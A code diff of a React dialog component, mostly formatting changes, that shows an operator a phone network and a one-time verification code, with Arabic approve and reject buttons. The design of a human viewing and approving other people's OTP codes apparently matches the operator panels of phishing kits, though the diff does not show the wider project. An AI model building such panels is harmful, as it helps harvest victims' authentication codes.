@@ -1,7 +1,7 @@
-"use client"
+"use client";
 
-import { useState } from "react"
-import { toast } from "sonner"
+import { useState } from "react";
+import { toast } from "sonner";
 import {
   Dialog,
   DialogContent,
@@ -9,18 +9,17 @@ import {
   DialogFooter,
   DialogHeader,
   DialogTitle,
-} from "@/components/ui/dialog"
-import { Button } from "@/components/ui/button"
-import { CheckCircle, XCircle, MessageSquare } from "lucide-react"
-import { usePagenameNavigation } from "@/lib/nabigate"
-import { Notification } from "@/lib/firebase"
+} from "@/components/ui/dialog";
+import { Button } from "@/components/ui/button";
+import { CheckCircle, XCircle, MessageSquare } from "lucide-react";
+import { Notification } from "@/lib/firebase";
 
 interface PhoneDialogProps {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-  notification: Notification | null
-  phoneOtp?: string
-  handlePhoneOtpApproval: (state: string, id: string) => Promise<void>
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+  notification: Notification | null;
+  phoneOtp?: string;
+  handlePhoneOtpApproval: (state: string, id: string) => Promise<void>;
 }
 
 export default function PhoneDialog({
@@ -30,8 +29,7 @@ export default function PhoneDialog({
   phoneOtp,
   handlePhoneOtpApproval,
 }: PhoneDialogProps) {
-  const [isLoading, setIsLoading] = useState(false)
-  const { navigateToPage } = usePagenameNavigation()
+  const [isLoading, setIsLoading] = useState(false);
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
@@ -50,7 +48,7 @@ export default function PhoneDialog({
               </p>
               <p className="text-sm text-muted-foreground">الشبكة</p>
               <p className="text-md font-mono font-medium mt-1">
-                { notification?.operator || "غير محدد"}
+                {notification?.operator || "غير محدد"}
               </p>
 
               <p className="text-sm text-muted-foreground mt-3">رمز التحقق</p>
@@ -63,7 +61,12 @@ export default function PhoneDialog({
         </div>
 
         <DialogFooter className="flex justify-between">
-          <Button type="button" variant="destructive" onClick={() => handlePhoneOtpApproval("rejected",notification!.id)} disabled={isLoading}>
+          <Button
+            type="button"
+            variant="destructive"
+            onClick={() => handlePhoneOtpApproval("rejected", notification!.id)}
+            disabled={isLoading}
+          >
             <XCircle className="h-4 w-4 mr-2" />
             رفض الرمز
           </Button>
@@ -71,7 +74,7 @@ export default function PhoneDialog({
             type="button"
             variant="default"
             className="bg-green-600 hover:bg-green-700"
-            onClick={() => handlePhoneOtpApproval("approved",notification!.id)}
+            onClick={() => handlePhoneOtpApproval("approved", notification!.id)}
             disabled={isLoading}
           >
             <CheckCircle className="h-4 w-4 mr-2" />
@@ -80,6 +83,5 @@ export default function PhoneDialog({
         </DialogFooter>
       </DialogContent>
     </Dialog>
-  )
+  );
 }
-
